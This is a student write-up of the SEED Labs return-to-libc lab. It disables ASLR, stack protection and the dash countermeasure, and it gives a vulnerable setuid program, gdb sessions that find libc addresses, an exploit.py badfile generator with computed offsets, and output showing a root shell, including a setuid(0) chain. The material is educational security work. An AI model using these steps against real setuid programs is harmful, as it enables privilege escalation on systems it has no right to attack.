---
layout:       post
title:        "SEED Labs 2.0: Return-to-libc Attack Lab (32-bit) Writeup"
category:     "Software Security"
tags:         software-security
permalink:    /posts/seedlabs/return2libc
---

For general overview and the setup package for this lab, please go to [SEED Labs official website](https://seedsecuritylabs.org). The lab assignment was conducted using SEED virtual machine configured on a AWS EC2 instance.

<!-- excerpt-end -->

## Table of Contents
{:.no_toc}
* TOC 
{:toc}

<br><br>

```text
     Non-Executable Stack
+---------------------------+
|                      <--  |
| ...                    |  |
+------------------------|--+
|     String Argument    |  |
+------------------------|--+ <--- %ebp + 8
|     Return Address     |  |--------------> system() function
+------------------------|--+
| Previous Frame Pointer |  |          
+------------------------|--+ <--- %ebp
| ...           Overflow |  |
| ...           Buffer   |  |
+---------------------------+
|                           |
```

## Environment Setup and Preparation

First of all, Ubuntu and several other Linux-based systems use **address space randomization** to randomize the starting address of heap and stack, making guessing the exact addresses difficult. Guessing addresses is one of the critical steps of buffer-overflow attacks. In this lab, we disable this
feature using the following command:

```bash
sudo sysctl -w kernel.randomize_va_space=0
```

When the memory address randomization is turned off, for the *same* program, the <code>libc</code> library is always loaded in the *same* memory address.

The <code>gcc</code> compiler implements a security mechanism called **StackGuard** to prevent buffer overflows. In the presence of this protection, buffer overflow attacks do not work. We can compile a program with StackGuard disabled using the <code>-fno-stack-protector</code> option:

```bash
# Use the -m32 flag to compile the program into 32-bit binary
gcc -m32 -fno-stack-protector <program_name>.c
```

Always compile a program using the "<code>-z noexecstack</code>" option in this lab:

```bash
gcc -m32 -z noexecstack -o test test.c
```

The non-executable stack countermeasure is exactly what we are trying to defeat!

Link <code>/bin/sh</code> to <code>zsh</code> to disable the protection by <code>/bin/dash</code> so that our commands can be executed in a <code>Set-UID</code> process:

```bash
sudo ln -sf /bin/zsh /bin/sh
```

Since our goal is to overwrite the return address of a vulnerable program with an address of our choice (in this assignment, the address of a C standard library function) that enables us to bypass the non-executable stack, it is natural to be curious about where those functions are.

```c
/* sysa1.c */
extern int system(), exit(), execv();

main() 
{
    printf("system(): 0x%08x\n", system);
    printf("exit(): 0x%08x\n", exit);
    printf("execv(): 0x%08x\n", execv);
}
```

Compile and run the above program:

```console
$ gcc -m32 -fno-stack-protector -z noexecstack -o sysa1 sysa1.c
$ ./sysa1
system(): 0xf7e03370
exit(): 0xf7df5ed0
execv(): 0xf7e8a410
```

In this second program, we ask the <code>dlsym()</code> function to return the addresses where these three shared objects are dynamically loaded into memory:

```c
/* sysa2.c */
#include <stdio.h>
#include <dlfcn.h>

void main()
{
    void *h, *p;

    h = dlopen(NULL, RTLD_LAZY);
    p = dlsym(h, "system");
    printf("system(): 0x%08x\n", p);
    p = dlsym(h, "exit");
    printf("exit(): 0x%08x\n", p);
    p = dlsym(h, "execv");
    printf("execv(): 0x%08x\n", p);
}
```

```c
#include <dlfcn.h>

/**
 * If (filename == NULL), returns a global symbol object handle;
 * via dlsym(), this handle provides access to the symbols
 * exported from the main application and dependent DLLs for the
 * main application that were loaded at program start-up.
 * The RTLD_LAZY flag is specified to defer the symbol
 * resolution until the first reference to the symbol.
 */
void *dlopen(const char *filename, int flags);
void *dlsym(void *restrict handle, const char *restrict symbol);
```

The <code>dlfcn.h</code> header file requires that <code>-ldl</code> be used with <code>gcc</code>, which tells the linker to link the <code>dl</code> library.

```console
$ ./sysa2
system(): 0xf7dfd370
exit(): 0xf7defed0
execv(): 0xf7e84410
```

Two programs produce different results because they refer to different symbols.

```console
$ ldd ./sysa1
    linux-gate.so.1 (0xf7fcf000)
    libc.so.6 => /lib32/libc.so.6 (0xf7dbd000)
    /lib/ld-linux.so.2 (0xf7fd1000)
$ ldd ./sysa2
    linux-gate.so.1 (0xf7fcf000)
    libdl.so.2 => /lib32/libdl.so.2 (0xf7fa3000)
    libc.so.6 => /lib32/libc.so.6 (0xf7db7000)
    /lib/ld-linux.so.2 (0xf7fd1000)
$ python
>>> 0xf7e03370 - 0xf7dbd000
287600
>>> 0xf7dfd370 - 0xf7db7000
287600
```

It is shown here that <code>system()</code> has an offset of <code>287600</code> from the start of <code>libc</code>. Similarly, we can find the offsets of other library functions.

Finally, we can compile our target vulnerable program <code>retlib.c</code>:

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#ifndef BUF_SIZE
#define BUF_SIZE 12
#endif

int bof(char *str)
{
    char buffer[BUF_SIZE];
    unsigned int *framep;

    // Copy ebp into framep
    asm("movl %%ebp, %0" : "=r" (framep));

    // Print out information for experiment purpose
    printf("Address of buffer[] inside bof():   0x%.8x\n", (unsigned)buffer);
    printf("Frame Pointer value inside bof():   0x%.8x\n", (unsigned)framep);

    // Buffer Overflow!
    strcpy(buffer, str);

    return 1;
}

int main(int argc, char **argv)
{
    char input[1000];
    FILE *badfile;

    badfile = fopen("badfile", "r");
    int length = fread(input, sizeof(char), 1000, badfile);
    printf("Address of input[] inside main():   0x%x\n", (unsigned int) input);
    printf("Input size: %d\n", length);

    bof(input);

    printf("(^_^)(^_^) Returned Properly (^_^)(^_^)\n");
    return 1;
}

// This function will be used in the optional task
void foo()
{
    static int i = 1;
    printf("Function foo() is invoked %d times\n", i++);
    return;
}
```

```console
$ make
gcc -m32 -DBUF_SIZE=12 -fno-stack-protector -z noexecstack -o retlib retlib.c
sudo chown root retlib && sudo chmod 4755 retlib
$ ls
Makefile exploit.py retlib retlib.c
```

## Task 1: Finding out the Addresses of <code>libc</code> Functions

```console
$ gdb -q retlib
Reading symbols from retlib...
(No debugging symbols found in retlib)
gdb-peda$ break main
Breakpoint 1 at 0x130f
gdb-peda$ run
Starting program: /home/seed/Documents/return2libc/retlib 
[----------------------------------registers-----------------------------------]
EAX: 0xf7fac808 --> 0xffffd6ac --> 0xffffd7f8 ("SHELL=/bin/bash")
EBX: 0x0 
ECX: 0x51a74f1d 
EDX: 0xffffd634 --> 0x0 
ESI: 0xf7faa000 --> 0x1e6d6c 
EDI: 0xf7faa000 --> 0x1e6d6c 
EBP: 0x0 
ESP: 0xffffd60c --> 0xf7de1ee5 (<__libc_start_main+245>:        add    esp,0x10)
EIP: 0x5655630f (<main>:        endbr32)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x5655630a <foo+58>: mov    ebx,DWORD PTR [ebp-0x4]
   0x5655630d <foo+61>: leave  
   0x5655630e <foo+62>: ret    
=> 0x5655630f <main>:   endbr32 
   0x56556313 <main+4>: lea    ecx,[esp+0x4]
   0x56556317 <main+8>: and    esp,0xfffffff0
   0x5655631a <main+11>:        push   DWORD PTR [ecx-0x4]
   0x5655631d <main+14>:        push   ebp
[------------------------------------stack-------------------------------------]
0000| 0xffffd60c --> 0xf7de1ee5 (<__libc_start_main+245>:       add    esp,0x10)
0004| 0xffffd610 --> 0x1 
0008| 0xffffd614 --> 0xffffd6a4 --> 0xffffd7d0 ("/home/seed/Documents/return2libc/retlib")
0012| 0xffffd618 --> 0xffffd6ac --> 0xffffd7f8 ("SHELL=/bin/bash")
0016| 0xffffd61c --> 0xffffd634 --> 0x0 
0020| 0xffffd620 --> 0xf7faa000 --> 0x1e6d6c 
0024| 0xffffd624 --> 0xf7ffd000 --> 0x2bf24 
0028| 0xffffd628 --> 0xffffd688 --> 0xffffd6a4 --> 0xffffd7d0 ("/home/seed/Documents/return2libc/retlib")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x5655630f in main ()
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0xf7e08420 <system>
gdb-peda$ p exit
$2 = {<text variable, no debug info>} 0xf7dfaf80 <exit>
```

Or we can also put these <code>gdb</code> commands into a file and then ask <code>gdb</code> to execute the commands from this file:

```console
$ cat gdb_command.txt
break main
run
p system
p exit
quit
$ gdb -q -batch -x gdb_command.txt ./retlib
```

## Task 2: Putting the shell string in the memory

Let us define a new shell variable <code>MYSHELL</code>, and let it contain the string "<code>/bin/sh</code>":

```console
$ export MYSHELL=/bin/sh
$ env | grep MYSHELL
MYSHELL=/bin/sh
```

The location of this variable in the memory can be found out easily using the following program:

```c
#include <stdio.h>

void main()
{
    char* shell = getenv("MYSHELL");
    if (shell)
        printf("%x\n", (unsigned int) shell);
}
```

The program name <code>prtenv</code> is chosen to match the length of <code>retlib</code>.

```console
$ gcc -m32 -z noexecstack -o prtenv prtenv.c
$ ./prtenv
ffffd838
```

It should be noted that the address of the <code>MYSHELL</code> environment variable is sensitive to the length of the program name because the program name is pushed onto the stack ahead of environment variables.

```console
$ mv prtenv ppprtenv
$ ./ppprtenv
ffffd834
```

We can use the following debugging method to print out the stack information:

```console
$ gcc -m32 -z noexecstack -g prtenv.c -o prtenv_dbg
$ gdb -q prtenv_dbg
...
gdb-peda$ break main
Breakpoint 1 at 0x11ed: file prtenv.c, line 1.
gdb-peda$ run
...
gdb-peda$ x/32s *((char **)environ)
0xffffd7e4:     "SHELL=/bin/bash"
0xffffd7f4:     "MYSHELL=/bin/sh"
0xffffd804:     "SUDO_GID=1000"
0xffffd812:     "SUDO_COMMAND=/usr/bin/su seed"
0xffffd830:     "SUDO_USER=ubuntu"
0xffffd841:     "PWD=/home/seed/Documents/return2libc"
0xffffd866:     "LOGNAME=seed"
0xffffd873:     "_=/usr/bin/gdb"
...
0xffffdfcc:     "/home/seed/Documents/return2libc/prtenv_dbg"
...
```

The program name is stored at address <code>0xffffdfcc</code>.

## Task 3: Launching the Attack

In the return-to-libc attack, we need to place the argument (i.e., the address of the "<code>/bin/sh</code>" string) on the stack before the vulnerable function jumps to the <code>system()</code> function by means of overflowing the target buffer. According to the [Linux manual page](https://man7.org/linux/man-pages/man3/system.3.html), the <code>system(ARG)</code> function first <code>fork()</code> a child process and then executes the command specified by <code>ARG</code> using <code>execl()</code> within that children. The arguments of the <code>execl()</code> function is a list of pointers to NULL-terminated character strings.

The <code>exploit.py</code> program file is provided to help us create the content of <code>badfile</code>:

```python
#!/usr/bin/env python3
import sys

# Fill content with non-zero values
content = bytearray(0xaa for i in range(300))

X = 0
sh_addr = 0x00000000        # The address of "/bin/sh"
content[X:X+4] = (sh_addr).to_bytes(4, byteorder='little')

Y = 0
system_addr = 0x00000000    # The address of system()
content[Y:Y+4] = (system_addr).to_bytes(4, byteorder='little')

Z = 0
exit_addr = 0x00000000      # The address of exit()
content[Z:Z+4] = (exit_addr).to_bytes(4, byteorder='little')

# Save content to a file
with open("badfile", "wb") as f:
  f.write(content)
```

To figure out the three addresses and the values for <code>X</code>, <code>Y</code>, and <code>Z</code>, we can debug the <code>retlib.c</code> program and calculate the distance between <code>%ebp</code> and <code>buffer</code> inside the function <code>bof()</code>:

```console
$ gcc -m32 -fno-stack-protector -z noexecstack -g -o retlib_dbg retlib.c
$ touch badfile
$ gdb -q retlib_dbg
...
gdb-peda$ break bof
Breakpoint 1 at 0x126d: file retlib.c, line 10.
gdb-peda$ run
...
gdb-peda$ next
...
gdb-peda$ p $ebp
$1 = (void *) 0xffffd1b8
gdb-peda$ p &buffer
$2 = (char (*)[12]) 0xffffd1a0
gdb-peda$ p/d 0xffffd1b8 - 0xffffd1a0
$3 = 24
gdb-peda$ p &system
$4 = (<text variable, no debug info> *) 0xf7e08420 <system>
gdb-peda$ p &exit
$5 = (<text variable, no debug info> *) 0xf7dfaf80 <exit>
gdb-peda$ find /bin/sh
Searching for '/bin/sh' in: None ranges
Found 2 results, display max 2 items:
   libc : 0xf7f52352 ("/bin/sh")
[stack] : 0xffffd7fc ("/bin/sh")
gdb-peda$ quit
```

The distance between <code>%ebp</code> and <code>buffer</code> is <code>24</code> bytes. Once we enter the <code>system()</code> function, the value of <code>%ebp</code> has gained four bytes. Therefore:

```python
Y = 24 + 4 = 28
system_addr = 0xf7e08420

Z = 24 + 8 = 32
exit_addr = 0xf7dfaf80

X = 24 + 12 = 36
sh_addr = 0xf7f52352
```

Sucessfully obtained the root shell:

```console
$ vim task3.py
$ sudo chmod u+x task3.py
$ ./task3.py
$ ./retlib
Address of input[] inside main():  0xffffd238
Input size: 300
Address of buffer[] inside bof():  0xffffd200
Frame Pointer value inside bof():  0xffffd218
# whoami
root
```

## Task 4: Defeat Shell's Countermeasure

In this task, we would like to defeat the countermeasure that automatically drops privileges when they are executed in a <code>Set-UID</code> process. Let us first change the symbolic link back:

```bash
sudo ln -sf /bin/dash /bin/sh
```

One approach, as documented by [Yu Song](https://withhhsong.com/seedlab_return_to_libc/#Task_4_Defeat_Shells_countermeasure), let the exploit program first overwrite the return address of <code>bof()</code> in order to execute <code>setuid(0)</code>, in which case the parameter <code>0</code> (four-byte) is generated by calling <code>sprintf</code> four times. Then, make a call to <code>system("/bin/sh")</code>.

```console
gdb-peda$ p sprintf
$1 = {<text variable, no debug info>} 0xf7e16e40 <sprintf>
gdb-peda$ p setuid
$2 = {<text variable, no debug info>} 0xf7e8fe30 <setuid>
gdb-peda$ p system
$3 = {<text variable, no debug info>} 0xf7e08420 <system>
gdb-peda$ p exit
$4 = {<text variable, no debug info>} 0xf7dfaf80 <exit>
```

We may check the return address of <code>bof()</code> by viewing its assembly code:

```assembly
Dump of assembler code for function bof:
   0x5655626d <+0>:     endbr32 
   0x56556271 <+4>:     push   ebp
   0x56556272 <+5>:     mov    ebp,esp
   0x56556274 <+7>:     push   ebx
   0x56556275 <+8>:     sub    esp,0x14
   0x56556278 <+11>:    call   0x56556170 <__x86.get_pc_thunk.bx>
   0x5655627d <+16>:    add    ebx,0x2d47
=> 0x56556283 <+22>:    mov    eax,ebp
   0x56556285 <+24>:    mov    DWORD PTR [ebp-0xc],eax
   0x56556288 <+27>:    lea    eax,[ebp-0x18]
   0x5655628b <+30>:    sub    esp,0x8
   0x5655628e <+33>:    push   eax
   0x5655628f <+34>:    lea    eax,[ebx-0x1fbc]
   0x56556295 <+40>:    push   eax
   0x56556296 <+41>:    call   0x565560c0 <printf@plt>
   0x5655629b <+46>:    add    esp,0x10
   0x5655629e <+49>:    mov    eax,DWORD PTR [ebp-0xc]
   0x565562a1 <+52>:    sub    esp,0x8
   0x565562a4 <+55>:    push   eax
   0x565562a5 <+56>:    lea    eax,[ebx-0x1f90]
   0x565562ab <+62>:    push   eax
   0x565562ac <+63>:    call   0x565560c0 <printf@plt>
   0x565562b1 <+68>:    add    esp,0x10
   0x565562b4 <+71>:    sub    esp,0x8
   0x565562b7 <+74>:    push   DWORD PTR [ebp+0x8]
   0x565562ba <+77>:    lea    eax,[ebp-0x18]
   0x565562bd <+80>:    push   eax
   0x565562be <+81>:    call   0x565560e0 <strcpy@plt>
   0x565562c3 <+86>:    add    esp,0x10
   0x565562c6 <+89>:    mov    eax,0x1
   0x565562cb <+94>:    mov    ebx,DWORD PTR [ebp-0x4]
   0x565562ce <+97>:    leave  ; That's it
   0x565562cf <+98>:    ret    
End of assembler dump.
```

Got the root shell, just as expected:

```console
$ ./retlib
Address of /bin/bash: 0xffffd840
Address of input[] inside main():  0xffffd23c
Input size: 256
Address of buffer[] inside bof():  0xffffd200
Frame Pointer value inside bof():  0xffffd218
# whoami
root
# id
uid=0(root) gid=1001(seed) groups=1001(seed),120(docker)
```

Although <code>dash</code> and <code>bash</code> both drop the <code>Set-UID</code> privilege, they will not do that if they are invoked with the <code>-p</code> option. There are actually many <code>libc</code> functions that allow us to directly execute "<code>/bin/bash -p</code>" without going through the <code>system()</code> function, including <code>execl()</code>, <code>execle()</code>, <code>execv()</code>, etc.